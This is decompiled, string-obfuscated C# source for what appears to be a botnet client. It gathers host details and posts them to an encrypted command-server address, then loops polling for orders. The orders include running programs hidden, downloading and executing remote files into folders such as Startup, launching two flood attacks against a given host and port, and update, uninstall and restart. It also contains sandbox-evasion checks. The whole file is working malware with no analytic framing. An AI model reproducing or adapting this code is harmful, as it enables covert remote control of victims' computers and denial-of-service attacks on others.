using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Web;
using System.Windows.Forms;

namespace ns0;

internal class Class4
{
	private string string_0 = GClass0.smethod_0("\\ŵɶͺѶԻؽ\u073a࠴\u093f\u0a3e୦\u0c64ൡ\u0e73ཡၮᅤብፒ");

	private string string_1 = GClass0.smethod_0("Kıɜ\u0332аԲ");

	private string string_2 = GClass0.smethod_0("MŐɗ\u0352Лԏذܧ\u082fल\u0a29ମనശฦ༯ဥᄺሢጥᐤᔿᙱᝣᡬᥴᨤᭈᱦᵼḧὖ\u2064Ⅺ≦⍮\u242e");

	private string string_3 = GClass0.smethod_0("BőȰ");

	private string string_4 = GClass0.smethod_0("}Šɦ\u036aѡշتݦ\u087a।");

	public string string_5 = GClass0.smethod_0("Cźɼ\u0375ѿոٽܭࡊ\u0962੦୬న\u0d4a\u0e67ཫၥᅤቧ፳");

	private string string_6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private Class0 class0_0 = new Class0();

	private Class6.Struct0 struct0_0;

	private Class7 class7_0 = new Class7();

	public Class4()
	{
		Class2 @class = new Class2(string_6, string_4);
		Class5 class2 = new Class5(string_5, Application.get_ExecutablePath());
		_ = Assembly.GetExecutingAssembly().GetModules()[0];
		_ = string_6 + GClass0.smethod_0("]") + string_4;
		if (!@class.method_0(string_0))
		{
			Environment.Exit(0);
		}
		struct0_0 = Class6.smethod_0();
		class2.method_0();
		method_0();
		while (true)
		{
			try
			{
				while (true)
				{
					string string_ = GClass0.smethod_0("aŤɮ\u036cеԵؠݭ\u0873४੦\u0b3c") + struct0_0.string_2;
					string text = method_3(string_2 + GClass0.smethod_0("XŨɵͱЪճ٪ݱ"), string_);
					if (text.Length == 0)
					{
						method_7(GClass0.smethod_0("$ųɢ\u036bѵ"));
					}
					else
					{
						method_7(text);
					}
				}
			}
			catch
			{
			}
		}
	}

	private void method_0()
	{
		try
		{
			Class2 @class = new Class2(string_6, string_4);
			@class.method_1();
			string string_ = GClass0.smethod_0("mųɪ\u0366м") + method_2(struct0_0.string_2) + GClass0.smethod_0("*Ŧɥ\u036dѭԺطܣࡪ\u0962੶\u0b3c") + struct0_0.int_0 + GClass0.smethod_0(".ŷɥ\u036bѥծ٧\u073c") + method_2(struct0_0.string_3) + GClass0.smethod_0(".Űɯ\u036bѲզ\u0670\u073c") + method_2(struct0_0.string_0) + GClass0.smethod_0("/ūɨͳѫհٱݻ࠼") + method_2(struct0_0.string_1) + GClass0.smethod_0("#ŲɦͰм") + method_2(string_3) + GClass0.smethod_0("#ūɴ\u036cм") + method_2(string_1);
			method_3(string_2 + GClass0.smethod_0("XŨɵͱЪճ٪ݱ"), string_);
		}
		catch
		{
		}
	}

	private string method_1(string string_7, string string_8)
	{
		string text = GClass0.smethod_0("");
		try
		{
			if (string_7.Contains(GClass0.smethod_0(",") + string_8 + GClass0.smethod_0(";")))
			{
				int startIndex = string_7.IndexOf(GClass0.smethod_0(",") + string_8 + GClass0.smethod_0(";")) + (string_8.Length + 2);
				string[] array = string_7.Substring(startIndex).Split(new char[1] { ' ' });
				if (array[0] != null)
				{
					return array[0];
				}
				return text.Trim();
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	private string method_2(string string_7)
	{
		char[] array = HttpUtility.HtmlEncode(string_7)!.ToCharArray();
		StringBuilder stringBuilder = new StringBuilder(string_7.Length + (int)((double)string_7.Length * 0.1));
		char[] array2 = array;
		foreach (char value in array2)
		{
			int num = Convert.ToInt32(value);
			if (num > 127)
			{
				stringBuilder.AppendFormat(GClass0.smethod_0(" Ħɿ\u0333ѿԺ"), num);
			}
			else
			{
				stringBuilder.Append(value);
			}
		}
		return stringBuilder.ToString();
	}

	private string method_3(string string_7, string string_8)
	{
		WebRequest webRequest = WebRequest.Create(string_7);
		webRequest.ContentType = GClass0.smethod_0("@ŐɯͲѴտٺݮ\u0870ॷ\u0a79ହ౭ഹ\u0e64ཥၦᄽቩ፡ᑿᕡᘦ\u177f\u187bᥤ\u1a62᭨ᱦᵫṧὧ\u2065");
		webRequest.Method = GClass0.smethod_0("TŌɑ\u0355");
		byte[] bytes = Encoding.ASCII.GetBytes(string_8);
		webRequest.ContentLength = bytes.Length;
		Stream requestStream = webRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = webRequest.GetResponse();
		if (response == null)
		{
			return null;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	private bool method_4()
	{
		Random random = new Random();
		try
		{
			int num = random.Next(5000, 10000);
			int tickCount = Environment.TickCount;
			Thread.Sleep(num);
			if ((tickCount + num >= Environment.TickCount - 20) & (tickCount + num <= Environment.TickCount + 20))
			{
				return false;
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	private bool method_5()
	{
		try
		{
			Process currentProcess = Process.GetCurrentProcess();
			foreach (ProcessModule module in currentProcess.Modules)
			{
				if (module.ModuleName == GClass0.smethod_0("XŨɠ\u036dуժ٩ܪࡧ८੭"))
				{
					return true;
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	private void method_6(string string_7, bool bool_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo(string_7);
		if (bool_0)
		{
			processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		}
		else
		{
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		}
		Process.Start(processStartInfo);
	}

	private void method_7(string string_7)
	{
		try
		{
			if (string_7.StartsWith(GClass0.smethod_0("$ųɢ\u036bѵ")))
			{
				Thread.Sleep(60000);
			}
			if (string_7.StartsWith(GClass0.smethod_0("(ŧɷ\u0363ѫշ٪ݶࡤ")))
			{
				string text = method_1(string_7, GClass0.smethod_0("wŪɶ\u0364"));
				bool bool_ = Convert.ToBoolean(Convert.ToInt32(method_1(string_7, GClass0.smethod_0("wūɭͶ"))));
				if (text != null)
				{
					method_6(text, bool_);
				}
			}
			if (string_7.StartsWith(GClass0.smethod_0("'Ųɡ\u0361Ѧխ")))
			{
				string text2 = method_1(string_7, GClass0.smethod_0("bŪɮ\u0364"));
				string text3 = method_1(string_7, GClass0.smethod_0("`Ŧɱ\u0375"));
				string arguments = method_1(string_7, GClass0.smethod_0("`ŭɬ"));
				bool flag = Convert.ToBoolean(Convert.ToInt32(method_1(string_7, GClass0.smethod_0("vŰɢͰѵ"))));
				if (text2 != null && text3 != null)
				{
					text3 = smethod_0(text3);
					WebClient webClient = new WebClient();
					webClient.DownloadFile(text2, text3);
					if (flag)
					{
						ProcessStartInfo startInfo = new ProcessStartInfo(text3, arguments);
						Process.Start(startInfo);
					}
				}
			}
			if (string_7.StartsWith(GClass0.smethod_0("+šɼͳѶգ٨ݬ\u086d॥")))
			{
				string text4 = method_1(string_7, GClass0.smethod_0("pţɧͷѪն٤"));
				int num = Convert.ToInt32(method_1(string_7, GClass0.smethod_0("jŬɵ")));
				int int_ = Convert.ToInt32(method_1(string_7, GClass0.smethod_0("sŮɷ\u0361Ѣզٲ")));
				if (text4 != null && num != 0)
				{
					if (class0_0.bool_0)
					{
						class0_0.method_1();
					}
					if (class7_0.bool_0)
					{
						class7_0.method_1();
					}
					class0_0.string_0 = text4;
					class0_0.int_0 = num;
					class0_0.int_1 = int_;
					class0_0.method_0();
				}
			}
			if (string_7.StartsWith(GClass0.smethod_0(",ſɿ\u0365ѹջٲݶࡠॶ\u0a70\u0b7b౯")) && class7_0.bool_0)
			{
				class7_0.method_1();
			}
			if (string_7.StartsWith(GClass0.smethod_0("&Ŵɠ\u0365Ѷն٩")))
			{
				method_0();
			}
			if (string_7.StartsWith(GClass0.smethod_0("+źɼ\u0368Ѷգ٨ݬ\u086d॥")))
			{
				if (class0_0.bool_0)
				{
					class0_0.method_1();
				}
				if (class7_0.bool_0)
				{
					class7_0.method_1();
				}
			}
			if (string_7.StartsWith(GClass0.smethod_0("(ŻɲͶѠն\u0670ݻ\u086f")))
			{
				string text4 = method_1(string_7, GClass0.smethod_0("lŬɱ\u0375"));
				int num2 = Convert.ToInt32(method_1(string_7, GClass0.smethod_0("tŬɰ\u0375")));
				int int_ = Convert.ToInt32(method_1(string_7, GClass0.smethod_0("sŮɷ\u0361Ѣզٲ")));
				int int_2 = Convert.ToInt32(method_1(string_7, GClass0.smethod_0("tũɦ\u036fѦնٲ")));
				if (text4 != null && num2 != 0)
				{
					if (class0_0.bool_0)
					{
						class0_0.method_1();
					}
					if (class7_0.bool_0)
					{
						class7_0.method_1();
					}
					class7_0.string_0 = text4;
					class7_0.int_0 = num2;
					class7_0.int_1 = int_2;
					class7_0.int_2 = int_;
					class7_0.method_0();
				}
			}
			if (string_7.StartsWith(GClass0.smethod_0("'Ŧɨ\u036cѱդ")))
			{
				Environment.Exit(0);
			}
			if (string_7.StartsWith(GClass0.smethod_0(")ŵɣͶѰբ\u0670ݵ")))
			{
				Application.Restart();
				Environment.Exit(0);
			}
		}
		catch
		{
		}
	}

	private static string smethod_0(string string_7)
	{
		try
		{
			if (string_7.Contains(GClass0.smethod_0("+őɿ;ѡե٨ݫ\u087dॡ੨୨\u0c41\u0d65\u0e77ལ\u103b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("-ŕɺ\u0379Ѿսٿݑ\u087fॾ\u0a61\u0b65౨൫\u0e7dཡ\u1068ᅨቁ፥ᑷᕣᘻ")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0(".Őɽͼѽՠ٠ݝ\u087e।੭\u0b7b౩൪เཬ\u1068ᅦቱጻ")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("3ŋɨ\u0369Ѯխ٦ݱ࠻")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("3Ōɢ\u0375Ѯհ٬ݲ࠻")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("(ŕɵͼѥչ٣ݻࡎॠ\u0a7a\u0b62\u0c65൱\u0e6b\u0f71ၻᄻ")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("1Ōɨ;Ѩմ٬ݰࡦॱ\u0a3b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("3ŀɮ\u0375ѱիٱݻ࠻")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.History) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("5Ňɣ\u0378Ѯո٧ݭ\u0873\u0945\u0a64୧౫൧\u0e3b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0(",řɻͰѳս\u0651ݿ\u087eॡ\u0a65୨౫ൽ\u0e61ཨ\u1068ᅁብ፷ᑣᔻ")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("6ņɳ\u034aѧժٶݰ\u0870०\u0a70\u0b3b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.MyComputer) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("7Łɲ\u034eѦիٲݫࡠ४\u0a77ୱ\u0c3b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.Personal) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("3Ņɾ\u034bѰշ٪ݡ࠻")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("6ņɳ\u0359ѡդٲݰ\u0876०\u0a71\u0b3b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("0řɭ\u0375ѵժ٪ݢ\u086e\u093b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.Personal) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("4ŝɾ\u0364ѭջ٩ݪࡀ६੨୦\u0c71\u0d3b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("0řɺ\u0368ѡշ٥ݮ\u0871\u093b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.Programs) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("2ŕɣ\u0366ѡխٶ\u073b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.Recent) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("2Ŕɣ\u036bѠ\u0557٭\u073b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.SendTo) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("1řɽ\u0369ѵղوݡ\u086dॷ\u0a3b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("3śɳ\u0367ѷհٶݲ࠻")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.Startup) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("2ŔɿͶѰզٯ\u073b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.System) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("1Şɬ\u0365ѷժ٤ݰࡦॱ\u0a3b")))
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.Templates) + string_7.Split(new char[1] { ':' })[2].Trim();
			}
			if (string_7.Contains(GClass0.smethod_0("4Ŏɣ\u0366Ѻռټݢ\u0874\u094b\u0a65୮౧\u0d3b")))
			{
				return Environment.MachineName;
			}
			if (string_7.Contains(GClass0.smethod_0("0Ŝɻ\u0362ѴՋ٥ݮࡧ\u093b")))
			{
				return Environment.UserName;
			}
			return string_7;
		}
		catch
		{
			return string_7;
		}
	}
}
